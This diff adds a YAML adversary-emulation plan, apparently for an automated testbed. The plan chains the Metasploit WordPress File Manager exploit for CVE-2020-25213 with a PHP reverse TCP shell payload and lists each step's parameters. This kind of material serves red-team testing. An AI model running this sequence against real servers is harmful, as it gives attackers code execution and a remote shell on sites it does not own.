@@ -1,0 +1,96 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-03 04:02:31 UTC+0000
+attack_action_sequence:
+  - uuid: a0f9a441-cf77-4411-bcf5-49b69a2a55c1
+    name: WordPress File Manager Unauthenticated Remote Code Execution
+    id:
+      - T1203
+      - T1210
+    source: Metasploit Exploit
+    supported_platforms:
+      - PHP
+    tactics:
+      - Execution
+      - Initial Access
+    technique:
+      - Exploitation for Client Execution
+      - Exploitation of Remote Services
+    description: The File Manager (wp-file-manager) plugin from 6.0 to 6.8 for WordPress
+      allows remote attackers to upload and execute arbitrary PHP code because it
+      renames an unsafe example elFinder connector file to have the .php extension.
+      This, for example, allows attackers to run the elFinder upload (or mkfile and
+      put) command to write PHP code into the wp-content/plugins/wp-file-manager/lib/files/
+      directory.
+    testbed:
+      CVE:
+        - CVE-2020-25213
+    execution:
+      executor: Metasploit Executor
+      command: set_exploit_module("multi/http/wp_file_manager_rce")
+    arguments:
+      RHOSTS:
+        CurrentSetting: ''
+        Required: true
+        Description: The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+      RPORT:
+        CurrentSetting: 80
+        Required: true
+        Description: The target port
+      SSLVersion:
+        CurrentSetting: Auto
+        Required: true
+        Description: 'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23
+          are auto-negotiate) (Accepted: Auto, TLS, SSL23, SSL3, TLS1, TLS1.1, TLS1.2)'
+      DOMAIN:
+        CurrentSetting: WORKSTATION
+        Required: true
+        Description: The domain to use for Windows authentication
+      TARGETURI:
+        CurrentSetting: /
+        Required: true
+        Description: Base path to WordPress installation
+      WPCONTENTDIR:
+        CurrentSetting: wp-content
+        Required: true
+        Description: The name of the wp-content directory
+      WPCHECK:
+        CurrentSetting: true
+        Required: true
+        Description: Check if the website is a valid WordPress install
+      COMMAND:
+        CurrentSetting: upload
+        Required: true
+        Description: 'elFinder commands used to exploit the vulnerability (Accepted:
+          upload, mkfile+put)'
+  - uuid: 886ad436-69e5-4fc0-a654-9a89955c142a
+    name: PHP Command Shell, Reverse TCP (via PHP)
+    id:
+      - T1059.005
+      - T1071.001
+    source: Metasploit Payload
+    supported_platforms:
+      - PHP
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - T1059.005
+      - T1071.001
+    description: Reverse PHP connect back shell with checks for disabled functions
+    execution:
+      executor: Metasploit Executor
+      command: set_payload_module("php/reverse_php")
+    arguments:
+      LHOST:
+        CurrentSetting: ''
+        Required: true
+        Description: The listen address (an interface may be specified)
+      LPORT:
+        CurrentSetting: '4444'
+        Required: true
+        Description: The listen port
+testbed_requirement:
+  OS: []
+  CVE:
+    - CVE-2020-25213
